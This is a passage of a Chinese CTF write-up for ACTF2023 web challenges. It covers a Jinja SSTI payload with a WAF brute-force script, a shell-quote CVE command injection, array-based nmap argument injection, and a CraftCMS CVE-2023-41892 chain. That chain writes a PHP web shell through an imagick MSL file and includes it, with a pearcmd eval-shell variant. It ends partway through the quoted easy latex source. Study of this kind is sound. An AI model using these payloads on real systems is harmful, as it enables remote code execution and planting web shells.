class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;cookies&#x27;</span>,<span class="hljs-string">&#x27;values&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;\&#123;\&#123;&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>],                          <span class="hljs-comment"># rule 5</span>    [<span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;cookies&#x27;</span>,<span class="hljs-string">&#x27;values&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>]                  <span class="hljs-comment"># rule 6</span>]<span class="hljs-keyword">def</span> <span class="hljs-title function_">singel_waf</span>(<span class="hljs-params"><span class="hljs-built_in">input</span>, rules</span>):    <span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>.lower()    <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> rules:        <span class="hljs-keyword">if</span> rule <span class="hljs-keyword">in</span> <span class="hljs-built_in">input</span>:            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> rule:    <span class="hljs-built_in">print</span>(singel_waf(payload, r))    url = <span class="hljs-string">f&quot;http://124.70.33.170:23001/write&quot;</span>payload = &#123;    <span class="hljs-string">&quot;story&quot;</span>: payload&#125;headers = &#123;    <span class="hljs-string">&quot;cookie&quot;</span>: <span class="hljs-string">&quot;session=eyJ2aXAiOnRydWV9.ZT6nUA.4tOazSMnwCaaCePfys-d64iI_Ks;&quot;</span>&#125;<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, url, headers=headers, json=payload, verify=<span class="hljs-literal">False</span>, timeout = (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))        <span class="hljs-keyword">if</span> response.json()[<span class="hljs-string">&#x27;status&#x27;</span>] != <span class="hljs-string">&#x27;error&#x27;</span>:            <span class="hljs-built_in">print</span>(response.headers)            exit()        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Failed&#x27;</span>)    <span class="hljs-keyword">except</span> :        a = <span class="hljs-number">1</span>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Error&#x27;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs handlebars"><span class="language-xml">//boogipop大佬的payload,    这意思不就是只禁用了[]或.吗？？</span><span class="language-xml"></span><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__getit&#x27;</span>+<span class="hljs-string">&#x27;em__&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat flag&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><span class="language-xml"></span><span class="language-xml">还有的就是普通拼接就完事了</span></code></pre></div><p>cookie修改为上一个脚本中拿到的cookie （上一个脚本要运行多次才能拿到cookie，这一个也要等一会）</p><p><img src="/../images/ACTF2023/image-20231031000510854.png" alt="image-20231031000510854"></p><p>等他出现响应的cookie，拿着session到&#x2F;story路由中即可</p><p><img src="/../images/ACTF2023/image-20231031000034338.png" alt="image-20231031000034338"></p><h2 id="Ave-Mujica’s-Masquerade"><a href="#Ave-Mujica’s-Masquerade" class="headerlink" title="Ave Mujica’s Masquerade"></a>Ave Mujica’s Masquerade</h2><p>跟<code>MyGO’s Live!!!!!</code>看似是母子题，但其实是完全不同的，题目中也说到了</p><div class="code-wrapper"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (url.<span class="hljs-built_in">includes</span>(<span class="hljs-string">&quot;:&quot;</span>)) &#123;     const parts = url.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;:&quot;</span>);     host = parts[<span class="hljs-number">0</span>];     port = parts.<span class="hljs-built_in">slice</span>(<span class="hljs-number">1</span>).join(<span class="hljs-string">&quot;:&quot;</span>);   &#125; <span class="hljs-keyword">else</span> &#123;     host = url;   &#125;   <span class="hljs-keyword">if</span> (port) &#123;     command = shellQuote.quote([<span class="hljs-string">&quot;nmap&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, port, host]); <span class="hljs-comment">// Construct the shell command</span>   &#125; <span class="hljs-keyword">else</span> &#123;     command = shellQuote.quote([<span class="hljs-string">&quot;nmap&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;80&quot;</span>, host]);   &#125;   nmap = spawn(<span class="hljs-string">&quot;bash&quot;</span>, [<span class="hljs-string">&quot;-c&quot;</span>, command]);</code></pre></div><p>这题其实是shell-quote在1.7.2版本的CVE</p><p><a href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html</a></p><p>在Linux环境下自己测试测试出成功即可（哭了，我的虚拟机不会提示，不太懂）</p><p>自己测不出来</p><p>他这转换原理不太懂，总之根据&#96;对语句进行解析，若解析到最后是 </p><div class="code-wrapper"><pre><code class="hljs autohotkey">`command`即可执行命令</code></pre></div><p>所以要适当利用\进行转义，而\又可以由shell-quote来生成</p><p>于是lolita大佬最终payload</p><div class="code-wrapper"><pre><code class="hljs elixir"><span class="hljs-number">1</span><span class="hljs-symbol">:`</span><span class="hljs-symbol">:`</span>\`echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9cp</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>/flag*<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>/app/public/<span class="hljs-number">1</span>.html\```<span class="hljs-symbol">:`</span></code></pre></div><p>若本地测试时要对<code>\</code>进行转义</p><div class="code-wrapper"><pre><code class="hljs dart"><span class="hljs-keyword">var</span> url=<span class="hljs-string">&quot;1:`:`\\`echo<span class="hljs-subst">$IFS</span><span class="hljs-subst">$9cp</span><span class="hljs-subst">$IFS</span><span class="hljs-subst">$9</span>/flag*<span class="hljs-subst">$IFS</span><span class="hljs-subst">$9</span>/app/public/1.html\\```:`&quot;</span></code></pre></div><p><img src="/../images/ACTF2023/image-20231031001733313.png" alt="image-20231031001733313"></p><h2 id="MyGO’s-Live"><a href="#MyGO’s-Live" class="headerlink" title="MyGO’s Live!!!!!"></a>MyGO’s Live!!!!!</h2><div class="code-wrapper"><pre><code class="hljs kotlin">function escaped(c) &#123;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27; &#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\ &#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;$&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\$&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;`&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\`&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&quot;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\&quot;&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;\\&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\\\&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;|&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\|&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&amp;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\&amp;&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\;&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&lt;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\&lt;&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;&gt;&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\&gt;&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;(&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\(&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\)&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&quot;&#x27;&quot;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\\&#x27;&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&quot;\n&quot;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\n&#x27;</span>;  <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&quot;*&quot;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\*&#x27;</span>;  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> c;&#125;.......    <span class="hljs-keyword">if</span> (url.includes(<span class="hljs-string">&quot;:&quot;</span>)) &#123;      <span class="hljs-keyword">const</span> parts = url.split(<span class="hljs-string">&quot;:&quot;</span>);      host = parts[<span class="hljs-number">0</span>];      port = parts.slice(<span class="hljs-number">1</span>).join(<span class="hljs-string">&quot;:&quot;</span>);    &#125; <span class="hljs-keyword">else</span> &#123;      host = url;    &#125;    let command = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-comment">// console.log(host);</span>    <span class="hljs-comment">// console.log(port);</span>    <span class="hljs-keyword">if</span> (port) &#123;      <span class="hljs-keyword">if</span> (isNaN(parseInt(port))) &#123;        res.send(<span class="hljs-string">&quot;我喜欢你&quot;</span>);        <span class="hljs-keyword">return</span>;      &#125;      command = [<span class="hljs-string">&quot;nmap&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, port, host].join(<span class="hljs-string">&quot; &quot;</span>); <span class="hljs-comment">// Construct the shell command</span>    &#125; <span class="hljs-keyword">else</span> &#123;      command = [<span class="hljs-string">&quot;nmap&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;80&quot;</span>, host].join(<span class="hljs-string">&quot; &quot;</span>);    &#125;    <span class="hljs-keyword">var</span> fdout = fs.openSync(<span class="hljs-string">&#x27;stdout.log&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>);    <span class="hljs-keyword">var</span> fderr = fs.openSync(<span class="hljs-string">&#x27;stderr.log&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>);    nmap = spawn(<span class="hljs-string">&quot;bash&quot;</span>, [<span class="hljs-string">&quot;-c&quot;</span>, command], &#123;stdio: [<span class="hljs-number">0</span>,fdout,fderr] &#125; );</code></pre></div><p>。。。上车题，首先开了报错日志，命令输入错误就能看报错日志，别人的flag就在里面。。。</p><p>然后有人还直接把flag覆盖在了index.html，上线就一个flag摆在你面前。。。。</p><p>虽然上了车，但还是不会，结果lolita大佬看了一眼就知道是用数组</p><div class="code-wrapper"><pre><code class="hljs bash">?url[]=;<span class="hljs-built_in">ls</span> /</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash">?url[]=;<span class="hljs-built_in">cat</span>%20/flag-07349212197f72ae</code></pre></div><p><img src="/../images/ACTF2023/image-20231031002225089.png" alt="image-20231031002225089"></p><p>作者题目灵感来源的题目的解法（上传文件），有兴趣的可以看看</p><p><a href="https://siunam321.github.io/ctf/SekaiCTF-2023/Web/Scanner-Service/#exploitation">Scanner Service | Siunam’s Website (siunam321.github.io)</a></p><h2 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h2><p>（呜呜，明明都找到文章了，就是写不出来）</p><p><a href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2023-41892 CraftCMS远程代码执行漏洞分析 | Bmth’s blog (bmth666.cn)</a></p><p>p神的知识星球新trick，imagick的RCE</p><p> 麻了，看文章就行了</p><p>给出Lolita大佬成功的方案</p><div class="code-wrapper"><pre><code class="hljs JavaScript">第一个imagick往/tmp写php马----------------------------<span class="hljs-number">974726398307238472515955</span><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Disposition</span>: form-data; name=<span class="hljs-string">&quot;action&quot;</span>conditions/render----------------------------<span class="hljs-number">974726398307238472515955</span><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Disposition</span>: form-data; name=<span class="hljs-string">&quot;configObject&quot;</span>craft\elements\conditions\<span class="hljs-title class_">ElementCondition</span>----------------------------<span class="hljs-number">974726398307238472515955</span><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Disposition</span>: form-data; name=<span class="hljs-string">&quot;config&quot;</span>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;configObject&quot;</span>,<span class="hljs-string">&quot;as &quot;</span>:&#123;<span class="hljs-string">&quot;class&quot;</span>:<span class="hljs-string">&quot;Imagick&quot;</span>, <span class="hljs-string">&quot;__construct()&quot;</span>:&#123;<span class="hljs-string">&quot;files&quot;</span>:<span class="hljs-string">&quot;vid:msl:/tmp/php*&quot;</span>&#125;&#125;&#125;----------------------------<span class="hljs-number">974726398307238472515955</span><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Disposition</span>: form-data; name=<span class="hljs-string">&quot;image&quot;</span>; filename=<span class="hljs-string">&quot;poc.msl&quot;</span><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: text/plain&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;caption:<span class="hljs-symbol">&amp;lt;</span>?php system($_REQUEST[&#x27;cmd&#x27;]); ?<span class="hljs-symbol">&amp;gt;</span>&quot;</span>/&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;info:/tmp/lolita.php&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></span><span class="language-xml">----------------------------974726398307238472515955--</span><span class="language-xml"></span><span class="language-xml">第二包调用/tmp的这个文件</span><span class="language-xml">http://61.147.171.105:62732/?cmd=/readflag</span><span class="language-xml">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as xx&quot;:&#123;&quot;class&quot;:&quot;\\yii\\rbac\\PhpManager&quot;,&quot;__construct()&quot;:[&#123;&quot;itemFile&quot;:&quot;/tmp/lolita.php&quot;&#125;]&#125;&#125;</span></code></pre></div><p>写到&#x2F;tmp目录下，刚开始一直写到&#x2F;var&#x2F;www&#x2F;html&#x2F;web（当前目录）下（不知道行不行）</p><p>然后文件包含木马就行</p><p>那说到文件包含，就又出现一种写法———–pearcmd.php</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/+config-create+/&amp;/&lt;?=eval($_POST[1])?&gt;+/tmp/hello.php</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>61.147.171.105:51172<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>197<span class="language-swift">action<span class="hljs-operator">=</span>conditions<span class="hljs-operator">/</span>render<span class="hljs-operator">&amp;</span>configObject<span class="hljs-operator">=</span>craft\elements\conditions\<span class="hljs-type">ElementCondition</span><span class="hljs-operator">&amp;</span>config<span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;configObject&quot;</span>,<span class="hljs-string">&quot;as xx&quot;</span>:&#123;<span class="hljs-string">&quot;class&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-subst">\\</span>yii<span class="hljs-subst">\\</span>rbac<span class="hljs-subst">\\</span>PhpManager&quot;</span>,<span class="hljs-string">&quot;__construct()&quot;</span>:[&#123;<span class="hljs-string">&quot;itemFile&quot;</span>:<span class="hljs-string">&quot;/usr/local/lib/php/pearcmd.php&quot;</span>&#125;]&#125;&#125;</span></code></pre></div><p>没环境复现了，如果pearcmd路径错了就换其他的试一下</p><h2 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h2><p>完全没有思路，根本不会这种要用到自己服务器的东西</p><p>参考<a href="https://unk.icu/2023/10/31/ACTF2023/">ACTF2023 | unknown’s Blog</a>unknown师傅讲的比较细致</p><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>)<span class="hljs-keyword">const</span> rateLimit = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-rate-limit&#x27;</span>);<span class="hljs-keyword">const</span> ejs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ejs&#x27;</span>)<span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils/jwt&#x27;</span>)<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">Store</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils/store&#x27;</span>)<span class="hljs-keyword">const</span> &#123; visit &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./bot&#x27;</span>)<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VIP_URL</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">VIP_URL</span>    ?? <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;no VIP_URL set, use default&#x27;</span>)    ?? <span class="hljs-string">&#x27;https://ys.mihoyo.com/&#x27;</span><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">3000</span><span class="hljs-keyword">const</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Store</span>()<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<span class="hljs-keyword">const</span> <span class="hljs-title function_">md5</span> = (<span class="hljs-params">data</span>) =&gt; crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>).<span class="hljs-title function_">update</span>(data).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>)app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">&#x27;html&#x27;</span>, ejs.<span class="hljs-property">renderFile</span>);<span class="hljs-keyword">function</span> <span class="hljs-title function_">sign</span>(<span class="hljs-params">payload</span>) &#123;    <span class="hljs-keyword">const</span> prv_key = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;prv.key&#x27;</span>)    <span class="hljs-keyword">let</span> token = jwt.<span class="hljs-title function_">sign</span>(payload, prv_key, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;)    <span class="hljs-keyword">return</span> token&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">verify</span>(<span class="hljs-params">token</span>) &#123;    <span class="hljs-keyword">const</span> pub_key = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;pub.key&#x27;</span>)    <span class="hljs-keyword">try</span> &#123;        jwt.<span class="hljs-title function_">verify</span>(token, pub_key)        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>    &#125;&#125;<span class="hljs-keyword">const</span> <span class="hljs-title function_">getNonce</span> = (<span class="hljs-params">l</span>) =&gt; &#123;    <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(l / <span class="hljs-number">2</span>)).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)&#125;app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;))app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>())<span class="hljs-keyword">const</span> reportLimiter = <span class="hljs-title function_">rateLimit</span>(&#123;    <span class="hljs-attr">windowMs</span>: <span class="hljs-number">5</span> * <span class="hljs-number">1000</span>,    <span class="hljs-attr">max</span>: <span class="hljs-number">1</span>,&#125;);<span class="hljs-keyword">const</span> <span class="hljs-title function_">auth</span> = (<span class="hljs-params">req, res, next</span>) =&gt; &#123;    <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>    <span class="hljs-keyword">if</span> (!token) &#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;login required&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">verify</span>(token)) &#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;illegal token&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">let</span> claims = jwt.<span class="hljs-title function_">decode</span>(token)    req.<span class="hljs-property">session</span> = claims    <span class="hljs-title function_">next</span>()&#125;app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;static&#x27;</span>))app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>)&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">md5</span>(username) != password) &#123;        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;login&#x27;</span>, &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;login failed&#x27;</span> &#125;)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">let</span> token = <span class="hljs-title function_">sign</span>(&#123; username, <span class="hljs-attr">isVip</span>: <span class="hljs-literal">false</span> &#125;)    res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>, token)    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>)&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>, &#123; <span class="hljs-attr">login</span>: !!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span> &#125;)&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/preview&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> &#123; tex, theme &#125; = req.<span class="hljs-property">query</span>    <span class="hljs-keyword">if</span> (!tex) &#123;        tex = <span class="hljs-string">&#x27;Today is \\today.&#x27;</span>    &#125;    <span class="hljs-keyword">const</span> nonce = <span class="hljs-title function_">getNonce</span>(<span class="hljs-number">16</span>)    <span class="hljs-keyword">let</span> base = <span class="hljs-string">&#x27;https://cdn.jsdelivr.net/npm/latex.js/dist/&#x27;</span>    <span class="hljs-keyword">if</span> (theme) &#123;        base = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(theme, <span class="hljs-string">`http://<span class="hljs-subst">$&#123;req.headers.host&#125;</span>/theme/`</span>) + <span class="hljs-string">&#x27;/&#x27;</span>    &#125;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;preview.html&#x27;</span>, &#123; tex, nonce, base &#125;)&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/note&#x27;</span>, auth, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">let</span> &#123; tex, theme &#125; = req.<span class="hljs-property">body</span>    <span class="hljs-keyword">if</span> (!tex) &#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;empty tex&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">if</span> (!theme || !req.<span class="hljs-property">session</span>.<span class="hljs-property">isVip</span>) &#123;        theme = <span class="hljs-string">&#x27;&#x27;</span>    &#125;    <span class="hljs-keyword">const</span> id = notes.<span class="hljs-title function_">add</span>(&#123; tex, theme &#125;)    <span class="hljs-keyword">let</span> msg = (!req.<span class="hljs-property">body</span>.<span class="hljs-property">theme</span> || req.<span class="hljs-property">session</span>.<span class="hljs-property">isVip</span>) ? <span class="hljs-string">&#x27;&#x27;</span> : <span class="hljs-string">&#x27;Be VIP to enable theme setting!&#x27;</span>    msg += <span class="hljs-string">`\nYour note link: http://<span class="hljs-subst">$&#123;req.headers.host&#125;</span>/note/<span class="hljs-subst">$&#123;id&#125;</span>`</span>    msg += <span class="hljs-string">`\nShare it via http://<span class="hljs-subst">$&#123;req.headers.host&#125;</span>/share/<span class="hljs-subst">$&#123;id&#125;</span>`</span>    res.<span class="hljs-title function_">send</span>(msg.<span class="hljs-title function_">trim</span>())&#125;)app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/note/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">const</span> note = notes.<span class="hljs-title function_">get</span>(req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)    <span class="hljs-keyword">if</span> (!note) &#123;        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;note not found&#x27;</span>);        <span class="hljs-keyword">return</span>    &#125;    <span class="hljs-keyword">const</span> &#123; tex, theme &#125; = note    <span class="hljs-keyword">const</span> nonce = <span class="hljs-title function_">getNonce</span>(<span class="hljs-number">16</span>)    <span class="hljs-keyword">let</span> base = <span class="hljs-string">&#x27;https://cdn.jsdelivr.net/npm/latex.js/dist/&#x27;</span>    <span class="hljs-keyword">let</span> theme_url = <span class="hljs-string">`http://<span class="hljs-subst">$&#123;req.headers.host&#125;</span>/theme/`</span>    <span class="hljs-keyword">if</span> (theme) &#123;        base = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(theme, <span class="hljs-string">`http://<span class="hljs-subst">$&#123;req.headers.host&#125;</span>/theme/`</span>) + <span class="hljs-string">&#x27;/&#x27;</span>    &#125;    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note.html&#x27;</span>, &#123; tex, nonce, base, theme_url &#125;)&#125;)app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/vip&#x27;</span>, auth, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>    <span class="hljs-keyword">let</span> &#123; code &#125; 